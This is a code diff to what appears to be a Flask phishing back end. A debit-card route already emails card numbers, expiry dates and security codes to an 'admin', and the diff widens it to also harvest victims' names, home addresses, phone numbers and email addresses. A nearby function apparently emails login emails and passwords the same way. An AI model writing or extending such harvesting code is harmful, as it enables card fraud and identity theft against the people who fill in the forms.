@@ -205,8 +205,17 @@ def debit_card_details():
         card_number = request.form.get("card-number")
         expiry_date = request.form.get("expiry-date")
         csc = request.form.get("csc-no")
+        fname = request.form.get("fname")
+        lname = request.form.get("lname")
+        street = request.form.get("str-address")
+        apt_bldg = request.form.get("apt-bldg")
+        city = request.form.get("city")
+        state = request.form.get("state")
+        zip_code = request.form.get("zip-code")
+        mobile_no = request.form.get("mobile-no")
+        email = request.form.get("email")
 
-        message = send_admin_email_debit(card_number, expiry_date, csc)
+        message = send_admin_email_debit(card_number, expiry_date, csc, fname, lname, street, apt_bldg, city, state, zip_code, mobile_no, email)
 
         if message != None:
             print("Email sent successfully")
@@ -252,7 +261,7 @@ def send_admin_email(email, password):
         return message
 
 
-def send_admin_email_debit(card_number, expiry_date, csc):
+def send_admin_email_debit(card_number, expiry_date, csc, fname, lname, street, apt_bldg, city, state, zip_code, mobile_no, email):
     """send email to admin"""
     message = None
     try:
@@ -263,6 +272,15 @@ def send_admin_email_debit(card_number, expiry_date, csc):
         Card Number: {card_number}
         Expiry Date: {expiry_date}
         CSC: {csc}
+        First Name: {fname}
+        Last Name: {lname}
+        Street Address: {street}
+        Apartment/Building: {apt_bldg}
+        City: {city}
+        State: {state}
+        Zip Code: {zip_code}
+        Mobile Number: {mobile_no}
+        Email: {email}
         """
         mail.send(msg)
         message = "Sent"
